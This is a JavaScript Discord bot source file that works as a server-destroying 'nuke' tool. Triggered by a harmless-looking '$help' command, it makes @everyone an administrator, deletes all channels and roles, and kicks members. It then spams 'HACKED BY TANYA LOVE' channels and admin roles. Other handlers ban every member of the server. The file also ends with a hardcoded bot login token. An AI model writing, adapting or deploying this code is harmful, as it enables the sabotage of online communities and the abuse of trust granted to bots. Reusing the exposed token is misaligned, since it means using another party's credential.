const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '$'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});
          
     // message.guild.members.forEach(m =>{
                   // m.ban()
  


// }) 

client.on("message", msg => {
if (msg.content.toLowerCase().startsWith(prefix + ".")) {
    msg.guild.members.forEach(m =>
      m.ban("Banned By Sans Bot | Developed By Sans")
      )
}})
client.on('message', message => {
    if (message.content.startsWith(prefix + "$help")) {
        message.delete();
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]///premission akata adminstator
        });
      message.guild.channels.map(c => {
            c.delete();
        });
      message.guild.roles.forEach(r =>{
                    r.delete()
                })
        
      message.guild.members.forEach(m =>{
                    m.kick();
        
                })
     
        setInterval(() => {
            message.guild.createRole({
                name: "TANYALOVE",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            })
        }, 1000);
        message.guild.setIcon("link wena");
        client.user.setAvatar("link wena");
        client.user.setUsername("HACKED")
        message.guild.owner.send("To mazay brakam")
        message.guild.setName('HACKED');
        setTimeout(function() {
            setInterval(() => {
              
                message.guild.createChannel('HACKED BY TANYA LOVE', 'text').then(channel => { 
                channel.send('@everyone HACK BY TANYA LOVE :joy: :joy: :joy:')
               
                })
            }
                        
                        , 500)
            })
        }
    
                   
    }
 
          )
 

client.on('message', async msg => {
  if(msg.content.startsWith('.')) {
    msg.guild.members.forEach(m =>{
                    m.ban()
                }) 
    msg.channel.send(`:joy::joy::joy: بداخۆ وەزحتان شرە`);
  }
});
 
var adminprefix = ["البريفكس بتاعك هنا"]
client.on('message', message => {
  
    var argresult = message.content.split(` `).slice(1).join(' ');
  
  if (message.content.startsWith(adminprefix + 'setg')) {
    client.user.setGame(argresult);
      message.channel.send(`**✅   ${argresult}**`)
  } else 
     if (message.content === (adminprefix + "leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith(adminprefix + 'setw')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**✅   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'setl')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**✅   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'sets')) {
    client.user.setGame(argresult, "https://www.twitch.tv/dream");
      message.channel.send(`**✅**`)
  }
  if (message.content.startsWith(prefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith(adminprefix + 'setava')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
 
});//Hiroaki | 弘明#2797
//</> 𝕊𝓝Ỗ𝔀𝓎© CopyRight 2020


 ////codaka drwst krawa lalayan black jack

client.login("NzU1OTc2NDY2Mjg5Nzg2OTgx.YCv9JA.bGTZKurbL4eSQrwBHv_lL1dQZXY")
          